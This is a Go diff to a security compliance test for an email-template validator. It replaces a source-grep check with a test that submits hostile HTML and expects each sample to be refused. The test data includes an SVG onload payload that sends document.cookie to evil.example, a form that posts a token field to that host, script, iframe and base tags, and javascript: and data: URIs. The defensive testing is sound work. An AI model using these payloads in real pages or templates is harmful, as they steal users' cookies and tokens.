@@ -3,6 +3,8 @@ package compliance
 import (
 	"strings"
 	"testing"
+
+	"github.com/42-v/vault42/internal/email"
 )
 
 // =============================================================================
@@ -214,17 +216,52 @@ func TestASVS_AbsentEndpointsAreActuallyAbsent(t *testing.T) {
 // The old reason was "No SVG is accepted or rendered". The stronger and truer
 // statement is that the one place SVG could arrive — an admin-authored email
 // template — rejects it, along with the rest of the active-content families.
+//
+// This used to grep internal/email/templates.go for each family name, and every
+// one of those greps was satisfied by a single line: the error string
+// validateTemplate returns, which itself lists
+// "script/iframe/object/embed/meta/base/link/style/svg/form tags,
+// javascript:/data: URIs". Replacing unsafePattern with a regex that matches
+// nothing left that sentence in place, so the test reported a control that had
+// been deleted. It now submits each hostile template to the exported validator
+// the admin write path calls and asserts the refusal, with a clean template as
+// the positive control so "rejects everything" cannot pass either.
 func TestASVS_V1_3_4_SVGAndActiveContentAreRejectedInEmailTemplates(t *testing.T) {
-	src := readCodeOnly(t, "internal/email/templates.go")
+	const subject = "Verify your address"
 
-	for _, tag := range []string{"svg", "script", "iframe", "object", "embed", "form", "base", "link"} {
-		if !strings.Contains(src, tag) {
-			t.Errorf("V1.3.4: the email-template content validator no longer names <%s>. "+
-				"That validator is the only thing standing between an admin-authored template "+
-				"and active content in a mail body.", tag)
-		}
+	if err := email.ValidateTemplateContent(subject, `<p>Hello from {{.AppName}}, <a href="{{.URL}}">verify</a>.</p>`); err != nil {
+		t.Fatalf("V1.3.4: an ordinary override was refused, so every rejection below could be "+
+			"the validator refusing everything: %v", err)
 	}
-	if !strings.Contains(src, "javascript:") || !strings.Contains(src, "data:") {
-		t.Error("V1.3.4: the validator no longer rejects javascript: or data: URIs")
+
+	for _, hostile := range []struct {
+		name string
+		html string
+	}{
+		{"svg", `<p>hi</p><svg onload="fetch('https://evil.example/'+document.cookie)"></svg>`},
+		{"script", `<p>hi</p><script>alert(1)</script>`},
+		{"iframe", `<iframe src="https://evil.example/"></iframe>`},
+		{"object", `<object data="https://evil.example/x.swf"></object>`},
+		{"embed", `<embed src="https://evil.example/x.swf">`},
+		{"form", `<form action="https://evil.example/"><input name="token"></form>`},
+		{"base", `<base href="https://evil.example/">`},
+		{"link", `<link rel="stylesheet" href="https://evil.example/x.css">`},
+		{"javascript URI", `<a href="javascript:alert(1)">click</a>`},
+		{"data URI", `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>`},
+	} {
+		t.Run(hostile.name, func(t *testing.T) {
+			if err := email.ValidateTemplateContent(subject, hostile.html); err == nil {
+				t.Errorf("V1.3.4: the validator accepted an override carrying %s. That validator is "+
+					"the only thing standing between an admin-authored template and active content "+
+					"in a mail body.", hostile.name)
+			}
+		})
+	}
+
+	// The subject line is compiled as a template of its own, so it is a second
+	// way in and is validated separately.
+	if err := email.ValidateTemplateContent(`<svg onload="alert(1)">`, `<p>hi</p>`); err == nil {
+		t.Error("V1.3.4: the validator accepted a subject line carrying an <svg> element; the subject " +
+			"is compiled as its own template and reaches the same mail body")
 	}
 }
